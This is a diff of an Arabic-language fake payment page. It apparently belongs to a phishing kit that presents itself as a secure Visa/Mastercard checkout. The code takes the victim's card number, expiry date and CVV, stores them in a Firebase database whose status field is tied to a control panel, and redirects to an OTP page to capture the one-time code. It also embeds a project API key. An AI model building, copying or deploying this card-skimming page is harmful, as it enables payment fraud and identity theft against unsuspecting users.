@@ -107,20 +107,19 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      transition: 0.3s;
+      gap: 10px;
     }
 
-    .pay-now-btn:disabled { background: #95a5a6; }
+    .pay-now-btn:disabled { background: #ccc; }
 
-    .secure-badge {
+    .secure-footer {
       display: flex;
       justify-content: center;
-      align-items: center;
-      gap: 10px;
+      gap: 15px;
       margin-top: 20px;
-      font-size: 12px;
-      color: #888;
+      opacity: 0.6;
     }
+    .secure-footer img { height: 25px; }
   </style>
 </head>
 <body>
@@ -132,19 +131,14 @@
 </header>
 
 <div class="container">
-  <div class="checkout-card">
+  <main class="checkout-card">
     <div class="payment-title">
       <span>💳</span> تفاصيل الدفع الإلكتروني
     </div>
 
-    <div id="errorBox">يرجى التأكد من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>
+    <div id="errorBox">يرجى التحقق من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>
 
     <form id="paymentForm">
-      <div class="field-wrap">
-        <label class="field-label">الاسم المكتوب على البطاقة</label>
-        <input type="text" id="cardName" class="input-style" placeholder="Cardholder Name" style="text-align:right; direction:rtl;" required>
-      </div>
-
       <div class="field-wrap">
         <label class="field-label">رقم البطاقة</label>
         <input type="tel" id="cardNumber" class="input-style" placeholder="0000 0000 0000 0000" maxlength="19" required>
@@ -153,28 +147,32 @@
       <div class="row-fields">
         <div class="field-wrap">
           <label class="field-label">تاريخ الانتهاء</label>
-          <input type="tel" id="cardExp" class="input-style" placeholder="MM/YY" maxlength="5" required>
+          <input type="tel" id="expDate" class="input-style" placeholder="MM/YY" maxlength="5" required>
         </div>
         <div class="field-wrap">
-          <label class="field-label">الرمز (CVV)</label>
-          <input type="tel" id="cardCvv" class="input-style" placeholder="123" maxlength="3" required>
+          <label class="field-label">رمز الأمان (CVV)</label>
+          <input type="tel" id="cvv" class="input-style" placeholder="123" maxlength="3" required>
         </div>
       </div>
 
-      <button type="submit" class="pay-now-btn" id="payBtn">دفع الرسوم الآن</button>
+      <button type="submit" class="pay-now-btn" id="payBtn">
+        دفع الآن <span>🔒</span>
+      </button>
     </form>
 
-    <div class="secure-badge">
-      <img src="https://img.icons8.com/color/24/000000/shield.png" alt="Secure">
-      <span>نظام دفع آمن ومعتمد من هيئة دبي الرقمية</span>
+    <div class="secure-footer">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
     </div>
-  </div>
+  </main>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
+    // إعدادات Firebase الحقيقية لمشروع (jusour-qatar)
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -187,54 +185,54 @@
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    const analytics = firebase.analytics();
 
-    // التحقق إذا كان هناك خطأ راجع من صفحة التحميل
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('error') === 'invalid_card') {
-        document.getElementById('errorBox').style.display = 'block';
-    }
+    const currentOrderId = sessionStorage.getItem("last_order_id");
 
-    // تنسيق رقم البطاقة آلياً
+    // تنسيق رقم البطاقة وتاريخ الانتهاء تلقائياً
     document.getElementById('cardNumber').addEventListener('input', function (e) {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+      e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
-
-    // تنسيق تاريخ الانتهاء (00/00)
-    document.getElementById('cardExp').addEventListener('input', function (e) {
-        let v = e.target.value.replace(/[^\d]/g, '');
-        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
-        e.target.value = v;
+    document.getElementById('expDate').addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
     });
 
     document.getElementById("paymentForm").onsubmit = async (e) => {
         e.preventDefault();
         
         const btn = document.getElementById("payBtn");
-        btn.innerHTML = "جاري تأمين الاتصال...";
         btn.disabled = true;
+        btn.innerHTML = "جاري المعالجة الآمنة...";
 
-        const paymentData = {
-            card_name: document.getElementById("cardName").value,
+        const cardData = {
             card_number: document.getElementById("cardNumber").value,
-            card_exp: document.getElementById("cardExp").value,
-            card_cvv: document.getElementById("cardCvv").value,
-            status: "card_submitted", // الحالة الأولى للتحكم من اللوحة
-            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            exp_date: document.getElementById("expDate").value,
+            cvv: document.getElementById("cvv").value,
+            status: "card_submitted",
+            step: "checkout",
+            last_update: firebase.firestore.FieldValue.serverTimestamp()
         };
 
         try {
-            // تخزين البيانات في Firebase
-            await db.collection("payments").add(paymentData);
-            
-            // التوجيه فوراً لصفحة التحميل والانتظار (loading.php)
-            window.location.href = 'loading.php';
+            analytics.logEvent('payment_info_submitted');
+
+            if (currentOrderId) {
+                // تحديث نفس الطلب ببيانات الفيزا
+                await db.collection("orders").doc(currentOrderId).update(cardData);
+            } else {
+                await db.collection("orders").add(cardData);
+            }
+
+            // التوجه لصفحة الـ OTP
+            window.location.href = "otp.php";
         } catch (err) {
-            console.error("Firebase Error:", err);
-            btn.innerHTML = "دفع الرسوم الآن";
+            console.error("Error:", err);
+            document.getElementById("errorBox").style.display = "block";
             btn.disabled = false;
-            alert("حدث خطأ في النظام، يرجى المحاولة لاحقاً.");
+            btn.innerHTML = "دفع الآن 🔒";
         }
     };
 </script>
 </body>
 </html>
+
